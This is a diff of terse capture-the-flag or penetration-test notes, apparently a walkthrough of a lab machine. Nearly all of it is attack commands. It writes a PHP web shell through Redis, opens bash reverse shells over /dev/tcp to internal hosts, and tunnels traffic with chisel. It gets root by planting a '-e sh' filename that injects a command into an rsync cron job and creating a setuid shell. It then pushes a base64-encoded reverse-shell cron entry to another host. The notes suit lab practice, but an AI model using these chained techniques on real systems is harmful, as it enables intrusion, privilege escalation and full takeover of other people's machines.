@@ -30,7 +30,7 @@ meterpreter: portfwd add -l <port4> -r 172.19.0.4 -p 80; -> visit http://127.0.0
 meterpreter: portfwd add -l 6379 -r 172.19.0.2 -p 6379; -> install redis-cli from github
 -> echo '<?php system($_REQUEST['cmd']); ?>' > redis.txt
 -> cat redis.txt | redis-cli -h 127.0.0.1 set <varname>
--> redis-cli; set dir /var/www/html; set db.php; save
+-> redis-cli; config set dir /var/www/html; config set dbfilename db.php; save
 curl http://127.0.0.1:<port4>/db.php?cmd=id - success -> grep burpsuite, send repeater & change request to POST : REQ1
 
 -- chisel setup(server1)
@@ -38,19 +38,19 @@ local: ./chisel server -p <port5> -reverse
 server1: upload chisel(meterpreter); ./chisel client <my ip>:<port5> <port6>:127.0.0.1:<port6>
 
 nc -lvnp <port6>
-set REQ1 cmd=bash -c 'bash -i >& /dev/tcp/172.19.0.3/<port6>' 0>&1' -- Need url encoding
+edit REQ1: cmd=bash -c 'bash -i >& /dev/tcp/172.19.0.3/<port6>' 0>&1' -- Need url encoding
 
 -- www-data shell
 / has unusual backup directory -> /backup/backup.sh: has vulnerable command: rsync -a *.rdb 
 & /etc/cron.d/backup runs every 3 min by root
 
-create file <anyname1>.rdb on /var/www/html/f*
+create file <anyname1>.rdb on /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
 #!/bin/sh
-cp /bin/sh /tmp/<anyname2>
+cp /bin/dash /tmp/<anyname2>  ---- bash cannot drop to root shell, so use dash
 chmod 4755 /tmp/<anyname2>    ---- may need to base64 encode, copy -> decode on local because of line character
 
 cd /var/www/html
-touch -- 'f*/-e sh <anyname1>' -> wait...
+touch -- 'f187a0ec71ce99642e4f0afbd441a68b/-e sh <anyname1>' -> wait...
 /tmp/<anyname2> -> root
 
 -- chisel download(server2)
@@ -63,5 +63,12 @@ server1: ./chisel client <my ip>:<port7> <port7>:127.0.0.1:<port7>
 server2: ./chisel client 172.19.0.3:<port 7> <port8>:127.0.0.1:<port8>
 
 echo 'bash -i >& /dev/tcp/172.20.0.2/<port8> 0>&1' | base64 -w 0 -> <output>
-echo '* * * * * root base64 -d <output> | bash' > <anyname>
-rsync -a <anyname> rsync://backup:837/src/
+server2: echo '* * * * * root base64 -d <output> | bash' > <anyname>
+server2: rsync -a <anyname> rsync://backup:837/src/
+local: nc -lvnp <port8> -> server3 shell
+
+mount; -- many mounting points verified, some are mounted on incorrect locations(ex:/dev/sda2)
+cd /tmp
+mkdir sda{1,2,3,4,5};
+for i in {1..5}; do mount /dev/sda$i sda$i; done;
+/dev/sda2/root -> root.txt
